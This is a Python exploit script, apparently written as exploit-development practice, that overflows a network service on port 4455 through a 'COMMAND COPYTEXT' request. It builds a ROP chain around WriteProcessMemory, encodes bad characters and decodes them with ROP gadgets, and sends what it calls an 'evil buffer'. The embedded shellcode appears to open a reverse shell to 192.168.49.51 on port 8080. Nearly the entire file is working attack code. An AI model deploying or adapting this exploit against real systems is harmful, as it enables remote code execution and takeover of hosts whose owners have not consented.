#!/usr/bin/python
import socket
import sys
from struct import pack


# BAD CHARS: x00, x0a, x11, x20, x28(kinda), x80, x81, x86

def map_bad_chars(sc):
    bad_chars = b"\x00\x0a\x20\x80"
    i = 0
    bad_indeces = []
    for i in range(len(sc)):
        for c in bad_chars:
            if sc[i] == c:
                bad_indeces.append(i)
    return bad_indeces


def encode_shellcode(sc):
    bad_chars = b"\x00\x0a\x20\x80"
    replace_chars = b"\x02\x0c\x22\x82"
    encoded_sc = sc
    for i in range(len(bad_chars)):
        encoded_sc = encoded_sc.replace(pack("B", bad_chars[i]), pack("B", replace_chars[i]))
    return encoded_sc

# Function: 
def decode_shellcode_rop(bad_indeces, sc):
    print(bad_indeces)
    print(sc)
    bad_chars = b"\x00\x0a\x20\x80"
    # add_chars = b"\xfe\xfe\xfe\xfe" 
    decoder_rop = b""
    decoder_rop += pack('<L', 0x741eda54) # pop ebx 
    decoder_rop += pack('<L', 0x414141fe) # value for pop (0xfe will be added to the bad bytes)
    for i in range(len(bad_indeces)):
        if i == 0:
            offset = bad_indeces[i]
        else:
            offset = bad_indeces[i] - bad_indeces[i-1]
        offset = (-offset) & 0xffffffff
        value = 0
        #for j in range(len(bad_chars)):
            #if sc[bad_indeces[i]] == bad_chars[j]:
                # value = add_chars[j]
        #value = value | 0x11111100
        # increase shellcode pointer to next bad char (eax holds start of shellcode)
        if offset == 0xffffffff:
            decoder_rop +=  pack('<L', 0x741f475d) # inc ecx
        elif offset == 0xfffffffd:
            decoder_rop +=  pack('<L', 0x742a3817) # add eax, 0x02
            decoder_rop +=  pack('<L', 0x741f475d) # inc ecx
        else:
            decoder_rop += pack('<L', 0x741f56a4) # pop ecx
            decoder_rop += pack('<L', offset) # offset to next bad char for pop
            decoder_rop += pack('<L', 0x742233a7) # neg eax
            decoder_rop += pack('<L', 0x7421feed) # add eax, ecx
            decoder_rop += pack('<L', 0x742233a7) # neg eax
        # pop in val of encoded byte - original byte (only low byte matters), add to byte at shellcode
        # decoder_rop += pack('<L', 0x741eda54) # pop ebx 
        # decoder_rop += pack('<L', value) # value for pop (ex. x01+xff = x00)
        decoder_rop += pack('<L', 0x7412c3eb) # add byte [eax], bl
    return decoder_rop



try:
    server = sys.argv[1]
    port = 4455
    size = 1500
    offset_size = 216
  
    # BAD CHARS: x00, x0a, x11, x20, x28(kinda), x80, x81, x86

    shellcode =  b""
    shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b"
    shellcode += b"\x52\x30\x8b\x52\x0c\x89\xe5\x8b\x52\x14\x31"
    shellcode += b"\xff\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xc0\xac"
    shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    shellcode += b"\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x01"
    shellcode += b"\xd0\x57\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
    shellcode += b"\x50\x8b\x58\x20\x8b\x48\x18\x01\xd3\x85\xc9"
    shellcode += b"\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31"
    shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
    shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
    shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
    shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
    shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
    shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
    shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
    shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
    shellcode += b"\x0a\x68\xc0\xa8\x31\x33\x68\x02\x00\x1f\x90"
    shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
    shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
    shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
    shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
    shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
    shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
    shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
    shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
    shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
    shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
    shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
    shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
    shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
    shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
    shellcode += b"\xff\xd5"


    command  = b"COMMAND COPYTEXT "
    
    ### [ ] WRITEPROCESSMEMORY CALL SKELETON WRITTEN ON STACK ###

    # skeleton WriteProcessMemory call
    wpm  = pack('<L', 0x61616161) # WriteProcessMemory address, placeholder ret
    wpm += pack('<L', 0x62626262) # code cave shellcode address, placeholder ret
    wpm += pack('<L', 0xffffffff) # hProcess (-1) arg
    wpm += pack('<L', 0x64646464) # lpBaseAddress (code cave shellcode) address, placeholder arg
    wpm += pack('<L', 0x65656565) # lpBuffer (stack shellcode) address, placeholder arg
    wpm += pack('<L', 0x66666666) # nSize, placeholder arg
    wpm += pack('<L', 0x67676767) # lpNumberOfBytes, placeholder arg

    ### [x] WRITEPROCESSMEMORY CALL SKELETON WRITTEN ON STACK ###


    # offset needed before EIP control overflow (size is dependent on wpm call size)
    offset = b'A' * (offset_size - len(wpm))


    ### [ ] SAVE A POINTER TO THE WPM SKELETON ###

    # initial rop gadget
    # get esp (stack pointing) value into another reg
    eip  = pack('<L', 0x63101eb1) # mov ebp, esp ; pop eax ; pop ecx ; dec eax
    
    # 1) get the intial stack pointing esp value into register eax for manipulation
    # 2) esp will move upward since ebp -> esp, reuse junk pops as retn + ret to move esp downward
    # ALTERNATIVELY just use 0x741eccd0: push esp ; pop esi (this was before I moved to KERNELBASE.dll) 
    rop  = pack('<L', 0x63101fb7) # 1) junk for pop, 2) retn 0x0010
    rop += pack('<L', 0x631010e9) # 1) junk for pop, 2) ret
    rop += pack('<L', 0x63101aa0) # push ebp ; mov ebp, esp ; mov eax, 0x631052C8 ; pop ebp
    rop += pack('<L', 0x63101edc) # lea eax, dword [ebp-0x04] ; add eax, 0x08 ; push ecx ; mov esp, ebp
    rop += pack('<L', 0x41414141) # padding for retn 0x0010
    rop += pack('<L', 0x41414141) # padding for retn 0x0010

    # manipulate the stack pointer to the WPM address placeholder
    # stack loc - 36 = WPM addr placeholder: eax = WPM addr placeholder
    rop += pack('<L', 0x631021b8) # pop ecx
    rop += pack('<L', 0xffffffdc) # -36 for pop, distance to WPM address placeholder
    rop += pack('<L', 0x63101ec2) # add eax, ecx

    # save the stack pointer in a less volatile location
    # eax -> esi, esi -> edx: edx = WPM addr placeholder
    rop += pack('<L', 0x63101ecd) # xchg eax, esi ; pop ebp
    rop += pack('<L', 0x41414141) # junk for pop
    rop += pack('<L', 0x742b24df) # mov edx, esi ; pop esi ; retn 0x0004
    rop += pack('<L', 0x41414141) # junk for pop

    ### [X] SAVE A POINTER TO THE WPM SKELETON (EDX) ###


    ### [ ] PATCH IN WPM AND SHELLCODE RETURN ADDRESSES ###

    # dereference WPM IAT pointer into WPM address placeholder
    # IAT WPM Pointer -> eax: eax = IAT WPM pointer
    rop += pack('<L', 0x63101eb3) # pop eax ; pop ecx ; dec eax
    rop += pack('<L', 0x41414141) # junk for retn 0x0004
    rop += pack('<L', 0x63103021) # IAT WPM pointer + 1 because 0x20 is a bad char
    rop += pack('<L', 0x28282828) # junk for pop (+ only first 0x28 is mangled, after this it can be used)
    # edx = WPM placeholder address, WPM placeholder address = WPM address
    rop += pack('<L', 0x74237c2a) # mov eax, dword [eax]
    rop += pack('<L', 0x741fb5b8) # mov dword [edx], eax ; xor eax, eax
    
    # increment edx down to the shellcode code cave placeholder return
    rop += pack('<L', 0x7428a775) * 4 # inc edx ; add al, 0x74 ; or eax, 0x8307B70F * 4
    # pop in the shellcode address and transfer it to shellcode placeholder return
    rop += pack('<L', 0x741ece04) # pop eax
    rop += pack('<L', 0x63102c60) # code cave shellcode address for pop
    rop += pack('<L', 0x741fb5b8) # mov dword [edx], eax ; xor eax, eax

    ### [x] PATCH IN WPM AND SHELLCODE RETURN ADDRESSES ###


    ### [ ] PATCH IN ALL WPM ARGUMENTS ### 

    # Skip hProcess arg since we already put -1 there (self)

    # increment edx down to the lpBaseAddress placeholder
    rop += pack('<L', 0x7428a775) * 8 # inc edx ; add al, 0x74 ; or eax, 0x8307B70F * 4
    # pop in the shellcode address and transfer it to lpBaseAddress placeholder
    rop += pack('<L', 0x741ece04) # pop eax
    rop += pack('<L', 0x63102c60) # code cave shellcode address for pop
    rop += pack('<L', 0x741fb5b8) # mov dword [edx], eax ; xor eax, eax

    # increment edx down to the lpBuffer placeholder
    rop += pack('<L', 0x7428a775) * 4 # inc edx ; add al, 0x74 ; or eax, 0x8307B70F * 4
    # pop in the shellcode (stack space) address and transfer to lpBuffer (known after full rop chain is built)
    # should be calculated relative from current position to start of shellcode
    rop += pack('<L', 0x741ece04) # pop eax
    rop += pack('<L', 0xfffffc40) # -0x3c0 (offset to stack shellcode) for pop
    rop += pack('<L', 0x742233a7) # neg eax
    rop += pack('<L', 0x742994f5) # add eax, edx
    rop += pack('<L', 0x741fb5b8) # mov dword [edx], eax ; xor eax, eax

    # inc down to nSize placeholder
    rop += pack('<L', 0x7428a775) * 4 # inc edx ; add al, 0x74 ; or eax, 0x8307B70F * 4
    # pop in 3a0, size left in the code cave, and transfer to nSize placeholder
    rop += pack('<L', 0x741ece04) # pop eax
    rop += pack('<L', 0xfffffe50) # -1b0 (negated size) for pop
    rop += pack('<L', 0x742233a7) # neg eax
    rop += pack('<L', 0x741fb5b8) # mov dword [edx], eax ; xor eax, eax

    # inc down to lpNumberOfBytesWritten placeholder
    rop += pack('<L', 0x7428a775) * 4 # inc edx ; add al, 0x74 ; or eax, 0x8307B70F * 4
    # pop in the data cave address (writable space), and transfer to the placeholder
    rop += pack('<L', 0x741ece04) # pop eax
    rop += pack('<L', 0x6310533c) # data cave address for pop
    rop += pack('<L', 0x741fb5b8) # mov dword [edx], eax ; xor eax, eax

    ### [x] PATCH IN ALL WPM ARGUMENTS ### 


    ### [ ] APPEND SHELLCODE DECODING GADGETS ### 

    # BAD CHARS: x00, x0a, x11, x20, x28(kinda), x80, x81, x86
    # CHARS TO REPLACE: x00, x0a, x20, x80

    indeces = map_bad_chars(shellcode)
    encoded_shellcode = encode_shellcode(shellcode)
    decode_rop = decode_shellcode_rop(indeces, shellcode)

    # calc stack shellcode address and save it for rop decoding
    rop += pack('<L', 0x741ece04) # pop eax
    rop += pack('<L', 0xfffffc48) # -0x3b8 (offset to stack shellcode) for pop
    rop += pack('<L', 0x742233a7) # neg eax
    rop += pack('<L', 0x742994f5) # add eax, edx
    
    rop += decode_rop


    ### [x] APPEND SHELLCODE DECODING GADGETS ### 


    ### [ ] RETURN INTO WRITEPROCESSMEMORY CALL ### 

    # move pointer back up to the WPM addr, move pointer into esp to be returned into
    rop += pack('<L', 0x74249be4) # mov eax, edx ; pop ebp 
    rop += pack('<L', 0x41414141) # junk for pop
    rop += pack('<L', 0x741f56a4) # pop ecx
    rop += pack('<L', 0xffffffe4) # -0x1c, offset to WPM address, for pop
    rop += pack('<L', 0x7421feed) # add eax, ecx
    rop += pack('<L', 0x7424a8a1) # xchg eax, ebp ; pop eax
    rop += pack('<L', 0x41414141) # junk for pop
    rop += pack('<L', 0x741eefdb) # mov esp, ebp ; pop ebp 
    rop += pack('<L', 0x41414141) # junk for pop

    ### [x] RETURN INTO WRITEPROCESSMEMORY CALL ### 


    offset2 = b"C" * (0x3b0-len(rop))

    end = b"\r\n"

    full_buf = command + offset + wpm + eip + rop + offset2 + encoded_shellcode + end
    print(full_buf)

    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(full_buf)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")



